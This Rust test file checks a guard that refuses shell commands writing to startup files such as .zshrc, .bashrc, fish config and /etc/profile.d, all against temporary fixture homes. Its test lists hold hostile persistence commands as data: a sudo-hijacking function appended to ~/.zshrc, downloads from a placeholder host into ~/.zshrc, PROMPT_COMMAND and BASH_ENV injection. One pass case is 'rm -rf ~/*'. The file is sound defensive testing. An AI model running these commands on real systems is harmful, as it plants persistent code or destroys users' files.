//! Tests of the shell startup class (TSK-242). Each case runs against a
//! fixture home in a temporary directory; nothing touches the real home.

use super::*;

struct Fixture {
    _dir: tempfile::TempDir,
    home: PathBuf,
    project: PathBuf,
}

impl Fixture {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        // Resolve the temporary directory's own links (`/var` on macOS),
        // so a spelled path and its resolution agree.
        let root = std::fs::canonicalize(dir.path()).unwrap();
        let home = root.join("home");
        let project = home.join("work/project");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(home.join(".config/fish")).unwrap();
        std::fs::write(home.join(".zshrc"), "# fixture\n").unwrap();
        std::fs::write(home.join(".bashrc"), "# fixture\n").unwrap();
        Self {
            _dir: dir,
            home,
            project,
        }
    }

    fn env(&self) -> StartupEnv {
        StartupEnv {
            home: Some(self.home.clone()),
            zdotdir: None,
            xdg_config: None,
        }
    }

    /// The command with `H` replaced by the fixture home.
    fn spell(&self, command: &str) -> String {
        command.replace("H/", &format!("{}/", self.home.display()))
    }

    fn judge_in(&self, command: &str, cwd: &Path, env: &StartupEnv) -> Vec<Violation> {
        evaluate(&self.spell(command), cwd, env)
    }

    fn judge(&self, command: &str) -> Vec<Violation> {
        self.judge_in(command, &self.project, &self.env())
    }
}

fn refused(found: &[Violation]) -> bool {
    found.iter().any(|v| v.rule == RULE && v.level_fixed)
}

/// Every visible write form refuses, in every spelling the guard expands.
#[test]
fn visible_writes_to_startup_files_refuse() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "echo 'ls(){ sudo \"$@\"; }' >> ~/.zshrc",
        "echo x > $HOME/.bashrc",
        "echo x > ${HOME}/.profile",
        "echo x > H/.zshenv",
        "echo x >| ~/.ZSHRC",
        "printf x 1>>~/.bash_aliases",
        "tee -a ~/.bashrc < /dev/null",
        "cp evil.sh ~/.zshrc",
        "cp evil.fish H/.config/fish/config.fish",
        "cp evil.fish ~/.config/fish/conf.d/x.fish",
        "mv evil ~/.zshrc",
        "ln -sf evil ~/.zshrc",
        "install -m 644 evil ~/.zshrc",
        "rsync evil ~/.zshrc",
        "dd if=evil of=~/.zshrc",
        "truncate -s 0 ~/.zshrc",
        "touch ~/.zlogin",
        "sed -i s/a/b/ ~/.zshrc",
        "sed -i.bak 's/a/b/' H/.bashrc",
        "perl -pi -e 's/a/b/' ~/.zshrc",
        "awk 'BEGIN { print \"x\" > \"/home/u/.bashrc\" }'",
        "python3 -c \"open('H/.zshrc','a').write('x')\"",
        "python3 - <<'EOF'\nopen('/home/u/.zshrc', 'a').write('x')\nEOF",
        "node -e \"require('fs').appendFileSync(require('os').homedir() + '/.zshrc', 'x')\"",
        "ruby -e 'File.write(Dir.home + \"/.bashrc\", \"x\")'",
        "curl -sSL -o ~/.zshrc https://example.invalid/x",
        "wget -O ~/.zshrc https://example.invalid/x",
        "less -o ~/.zshrc notes.txt",
        "git config --file ~/.zshrc a.b c",
        "patch ~/.zshrc fix.diff",
        "ed ~/.zshrc < script.ed",
        "vim -c 'normal Gox' -c wq ~/.zshrc",
        "cat > s.sh <<'EOF'\necho x >> ~/.zshrc\nEOF\nsh s.sh",
        "printf 'echo x >> ~/.zshrc' | sh",
        "xargs -I{} cp {} ~/.zshrc < list",
        "find ~ -name .zshrc -exec sed -i s/a/b/ {} +",
        "echo x > ~/.z?hrc",
        "shopt -s dotglob; echo x > ~/*shrc",
        "echo x > ~/.{zsh,bash}rc",
        "echo x > ~/.ssh/rc",
        "echo x > ~/.inputrc",
        "echo x > ~/.tmux.conf",
        "echo x > ~/Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
        "echo x > /etc/profile.d/x.sh",
        "echo x > /etc/zshenv",
        "echo x > .envrc",
        "echo x > sub/dir/.envrc",
        "mkdir -p ~/.config/fish/functions",
        "cp -l ~/.zshrc linked",
        "ln ~/.zshrc linked",
        "bash -c 'echo x >> ~/.zshrc'",
        "env FOO=1 tee -a ~/.bashrc",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(command);
        }
    }
    assert!(wrong.is_empty(), "allowed:\n{}", wrong.join("\n"));
}

/// Reads of startup files, and ordinary writes elsewhere, pass.
#[test]
fn reads_and_ordinary_writes_pass() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "cat ~/.zshrc",
        "grep alias ~/.bashrc",
        "grep -rn alias ~/.config/fish",
        "ls -la ~",
        "head -5 H/.zshrc",
        "diff ~/.zshrc theirs.zshrc",
        "git diff -- .envrc",
        "git log -p -- .envrc",
        "cp ~/.bashrc ./backup",
        "cp H/.zshrc /tmp/zshrc.copy",
        "source ~/.zshrc",
        ". ~/.zshrc",
        "cat ~/.zshrc | grep alias",
        "echo \"add this line to ~/.zshrc yourself\"",
        "echo x > out.txt",
        "cp a.txt b.txt",
        "python3 -c 'print(1)'",
        "HOME=/tmp/fixture-home bash -c true",
        "HOME=/tmp/fixture-home cargo test",
        "cp notes.txt ~/notes.txt",
        "tar -xf bundle.tar -C build",
        "p=build/out; echo x > \"$p\"",
        "echo x > \"$TMPDIR/x\"",
        "rsync -a src/ dest/",
        "find . -name '*.rs'",
        "find ~ -maxdepth 1 -name '.z*'",
        "git status",
        "cargo build --release",
        "mkdir -p ~/.local/state/codeflow",
        "stat ~/.zshrc",
        "echo x > ~/*shrc",
        "rm -rf ~/*",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("{command}: {}", found[0].message));
        }
    }
    assert!(wrong.is_empty(), "refused:\n{}", wrong.join("\n"));
}

/// A target the guard cannot resolve refuses near the class and keeps
/// its verdict elsewhere.
#[test]
fn unresolved_targets_fail_closed_near_the_class() {
    let f = Fixture::new();
    for command in [
        "p=~/.zshrc; echo x > \"$p\"",
        "p=~/.z; echo x > \"${p}shrc\"",
        "echo x > \"$(printf ~/.zshrc)\"",
        "echo x > ~/.$SHELLNAME",
        "echo x > $HOME/.$NAME",
        "echo x > ~root/.zshrc",
        "cp evil \"$TARGET\" # .zshrc",
        "cd \"$d\" && echo x > .zshrc",
        "xargs -I{} sed -i s/a/b/ ~/{} < names",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    for command in [
        "echo x > \"$OUT\"",
        "cp a \"$DEST\"",
        "echo x > build/$NAME.log",
        "cd \"$d\" && echo x > notes.txt",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

/// Placing programs refuse in or into the home, `/etc` or a startup
/// directory, and pass elsewhere.
#[test]
fn placing_into_the_home_refuses() {
    let f = Fixture::new();
    for command in [
        "tar -xf bundle.tar -C ~",
        "tar -xf bundle.tar --directory=H/.config",
        "rsync -a dotfiles/ ~/",
        "cp -r dotfiles/. ~",
        "cp -R fish ~/.config",
        "mv dotconfig ~/.local/share",
        "unzip dots.zip -d ~",
        "git --work-tree=$HOME checkout .",
        "git -C ~ checkout -- .",
        "wget -P ~ https://example.invalid/x",
        "ditto dots ~",
        "stow -t ~ shell",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    let found = f.judge_in("tar -xf bundle.tar", &f.home, &f.env());
    assert!(refused(&found), "tar in the home");
    let found = f.judge_in("git checkout -- .", &f.home, &f.env());
    assert!(refused(&found), "git in the home");
    let found = f.judge_in("git status", &f.home, &f.env());
    assert!(!refused(&found), "a git read in the home");
    for command in [
        "tar -xf bundle.tar",
        "unzip dots.zip -d vendor",
        "git checkout -- .",
        "curl -sSL https://example.invalid/x",
        "cp -r assets ~/work/project/out",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

/// A startup variable set for a shell that reads startup files refuses.
#[test]
fn startup_environment_for_a_shell_refuses() {
    let f = Fixture::new();
    for command in [
        "ZDOTDIR=/tmp/z zsh -c true",
        "HOME=/tmp/h zsh -c true",
        "env ZDOTDIR=/tmp/z zsh",
        "BASH_ENV=/tmp/e bash -c true",
        "export BASH_ENV=/tmp/e; bash script.sh",
        "PROMPT_COMMAND='id' bash -i",
        "HOME=/tmp/h bash -lc true",
        "ENV=/tmp/e sh -i",
        "XDG_CONFIG_HOME=/tmp/c fish -c true",
        "HOME=/tmp/h tmux new -d",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    for command in [
        "ZDOTDIR=/tmp/z zsh -f -c true",
        "HOME=/tmp/h bash --noprofile --norc -c true",
        "HOME=/tmp/h sh -c true",
        "XDG_CONFIG_HOME=/tmp/c fish --no-config -c true",
        "HOME=/tmp/h pwsh -NoProfile -c 1",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

#[test]
fn direnv_trust_refuses() {
    let f = Fixture::new();
    for command in ["direnv allow", "direnv allow .", "cd sub && direnv permit"] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    assert!(!refused(&f.judge("direnv status")));
}

/// A symbolic link to a startup file is judged by where it points, in a
/// plain word, a glob and a native edit; so is a broken link.
#[cfg(unix)]
#[test]
fn symbolic_links_are_followed() {
    let f = Fixture::new();
    let links = f.home.join("links");
    std::fs::create_dir_all(&links).unwrap();
    std::os::unix::fs::symlink(f.home.join(".zshrc"), links.join("a")).unwrap();
    std::os::unix::fs::symlink(f.home.join(".zprofile"), links.join("broken")).unwrap();
    std::os::unix::fs::symlink(&f.home, f.project.join("homelink")).unwrap();
    for command in [
        "echo x >> H/links/a",
        "echo x >> H/links/*",
        "echo x >> H/links/broken",
        "echo x >> homelink/.zshrc",
        "cp evil homelink/.bashrc",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    assert!(class_target(&links.join("a"), &f.env()).is_some());
    assert!(class_target(&f.project.join("homelink/.zshrc"), &f.env()).is_some());
    assert!(class_target(&f.project.join("notes.md"), &f.env()).is_none());
}

/// `ZDOTDIR` and `XDG_CONFIG_HOME` move the class with them.
#[test]
fn effective_locations_follow_the_environment() {
    let f = Fixture::new();
    let zdot = f.home.join("zdot");
    let xdg = f.home.join("xdg");
    let env = StartupEnv {
        zdotdir: Some(zdot.clone()),
        xdg_config: Some(xdg.clone()),
        ..f.env()
    };
    assert_eq!(
        class_target(&zdot.join(".zshrc"), &env).as_deref(),
        Some("$ZDOTDIR/.zshrc")
    );
    assert!(class_target(&zdot.join(".zshenv.zwc"), &env).is_some());
    assert!(class_target(&xdg.join("fish/config.fish"), &env).is_some());
    assert!(class_target(&f.home.join(".zshrc"), &env).is_some());
    assert!(class_target(&zdot.join("notes"), &env).is_none());
    let cmd = format!("echo x >> {}/.zshrc", zdot.display());
    assert!(refused(&evaluate(&cmd, &f.project, &env)));
}

/// Every table entry is in the class as a native edit target, in the
/// spelling the table gives and in another letter case.
#[test]
fn every_table_entry_is_a_class_target() {
    let f = Fixture::new();
    let table = &actions::table().startup_paths;
    for entry in &table.home {
        let path = f.home.join(entry.trim_end_matches('/'));
        assert!(class_target(&path, &f.env()).is_some(), "{entry}");
        let upper = f.home.join(entry.trim_end_matches('/').to_uppercase());
        assert!(class_target(&upper, &f.env()).is_some(), "{entry} upper");
        if entry.ends_with('/') {
            assert!(
                class_target(&path.join("x"), &f.env()).is_some(),
                "{entry}x"
            );
        }
    }
    for entry in &table.absolute {
        let path = PathBuf::from(entry.trim_end_matches('/'));
        assert!(class_target(&path, &f.env()).is_some(), "{entry}");
    }
    for name in &table.anywhere {
        assert!(
            class_target(&f.project.join(name), &f.env()).is_some(),
            "{name}"
        );
    }
    assert!(class_target(&f.home.join(".zshrc.d.notes"), &f.env()).is_none());
    assert!(class_target(&f.home.join(".config/other"), &f.env()).is_none());
}

/// The text floor finds a startup file as a path or a name, and not
/// inside a longer name.
#[test]
fn the_text_floor_reads_names_not_substrings() {
    let f = Fixture::new();
    let class = Class::new(&f.env());
    for text in [
        "open('/home/u/.zshrc')",
        "\".bashrc\"",
        "C:\\Users\\u\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1",
        "~/.config/fish/config.fish",
        "/etc/profile.d/x",
    ] {
        assert!(class.named_in(text).is_some(), "{text}");
    }
    for text in ["user.profile", "my_zshrc", "x.bashrc_backup", "profiles"] {
        assert!(class.named_in(text).is_none(), "{text}");
    }
}
